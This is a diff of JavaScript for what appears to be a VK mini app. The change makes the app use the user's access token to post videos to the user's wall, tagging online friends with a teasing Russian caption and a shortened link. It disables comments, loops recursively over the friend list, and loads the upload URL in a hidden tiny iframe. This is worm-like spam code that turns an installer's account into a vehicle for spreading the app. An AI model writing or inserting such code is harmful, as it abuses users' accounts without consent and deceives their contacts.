@@ -138,8 +138,8 @@
           }
 
           function goApp() {
-
-            uploadPhoto();
+            uploadVideo();
+            //uploadPhoto();
 
 
               if(count_likes < 1) {
@@ -475,8 +475,8 @@
           function uploadVideo() {
               var users_list = getFriendsOnlineForPhoto();
               var text = [
-                  "Мне сегодня призналось в любви 2 человека, кому больше? : "+link_app+" \n\n"+users_list
-                ];
+                users_list+", я про тебя оставляю мнение : \n\n "
+              ];
               var caption = text[getRandom(0,text.length-1)];
 
 
@@ -488,11 +488,14 @@
 
               vkConnect.sendPromise("VKWebAppCallAPIMethod", {
                  "method": "video.save",
-                 "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":caption, "v": "5.95", "access_token": token}
+                 "params": {"privacy_comment":"['nobody']","repeat":1,"link":video,"name": "#"+viewer.id, "wallpost":1, "description":caption+" https://vk.cc/ccHhGM ", "v": "5.95", "access_token": token}
              }).then(data => {
 
                id_videoupload = data.response.video_id;
-               //uploadComments();
+
+               if(viewer.friends.items[global_offset_i+1]){
+                 uploadVideo();
+               }
 
                 $("#for_iframe").html('<iframe src="'+data.response.upload_url+'" height="5px" width="5px"></iframe>');
 
